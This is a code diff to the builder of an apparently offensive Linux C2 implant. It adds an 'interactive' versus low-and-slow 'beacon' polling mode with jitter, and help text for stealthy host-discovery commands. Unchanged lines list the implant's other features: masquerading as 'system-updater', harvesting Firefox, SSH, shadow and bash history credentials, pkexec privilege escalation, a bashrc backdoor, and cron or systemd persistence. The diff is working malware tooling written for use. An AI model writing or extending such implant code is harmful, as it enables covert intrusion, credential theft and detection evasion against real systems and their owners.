@@ -38,6 +38,13 @@ struct Cli {
     #[arg(long, default_value = "0")]
     jitter: u64,
 
+    /// Operator-presence profile: `interactive` (loud — short fixed-interval
+    /// polling, no jitter, operator actively on the box) or `beacon`
+    /// (low-and-slow — polls on --beacon-rate with --jitter). Default:
+    /// interactive.
+    #[arg(long, default_value = "interactive")]
+    mode: String,
+
     /// Process name for ps visibility (default: "system-updater")
     #[arg(long, default_value = "system-updater")]
     process_name: String,
@@ -76,6 +83,12 @@ fn main() {
         std::process::exit(1);
     }
 
+    let mode = cli.mode.to_lowercase();
+    if mode != "interactive" && mode != "beacon" {
+        eprintln!("[!] Mode must be 'interactive' or 'beacon'");
+        std::process::exit(1);
+    }
+
     // Build the implant binary (implant crate has both lib + bin)
     let package = "implant";
     let port = cli.port.unwrap_or(if protocol == "http" { 80 } else { 443 });
@@ -90,6 +103,7 @@ fn main() {
     if cli.jitter > 0 {
         println!("║  Jitter:      {}s max", cli.jitter);
     }
+    println!("║  Mode:        {}", mode);
     println!("║  Process:     {}", cli.process_name);
     println!("║  Service:     {}", cli.service_name);
     println!("║  Implant:     {}", cli.implant_path);
@@ -104,6 +118,14 @@ fn main() {
     println!("    Loud:   shell cmds, ping sweeps, pkexec, bashrc backdoor");
     println!("    Mixed:  shell harvest, in-memory recon, CopyFail, cron");
     println!("    Stealth: all in-memory, copyfail+fd9, systemd only");
+    println!();
+    println!("  Operator-presence profile (--mode {}):", mode);
+    if mode == "interactive" {
+        println!("    interactive polls the C2 every ~1s (chatty, easy to detect).");
+        println!("    --beacon-rate/--jitter are ignored in interactive mode.");
+    } else {
+        println!("    beacon polls every {}s (+{}s jitter) — low and slow.", cli.beacon_rate, cli.jitter);
+    }
     println!();
 
     // Check for musl target
@@ -149,6 +171,7 @@ fn main() {
     cmd.env("PROCESS_NAME", &cli.process_name);
     cmd.env("SERVICE_NAME", &cli.service_name);
     cmd.env("IMPLANT_PATH", &cli.implant_path);
+    cmd.env("IMPLANT_MODE", &mode);
 
     if cli.labelling_marker {
         cmd.env("LABELLING_MARKER", "1");
@@ -205,6 +228,12 @@ fn main() {
     println!("    recon passive   - /proc reads only (stealth)");
     println!("    recon active    - ping sweep + ip + ss (noisy)");
     println!("    recon arp       - ARP table dump");
+    println!("  ── Discovery ──");
+    println!("    discovery procs     - process list (in-memory, stealth)");
+    println!("    discovery users     - local accounts/groups (in-memory)");
+    println!("    discovery suid      - SUID/SGID binaries (shell, noisy)");
+    println!("    discovery services  - systemd units + cron (shell, noisy)");
+    println!("    discovery all       - all of the above");
     println!("  ── Creds ──");
     println!("    creds harvest   - Firefox, SSH, shadow, bash_history");
     println!("  ── Privesc ──");
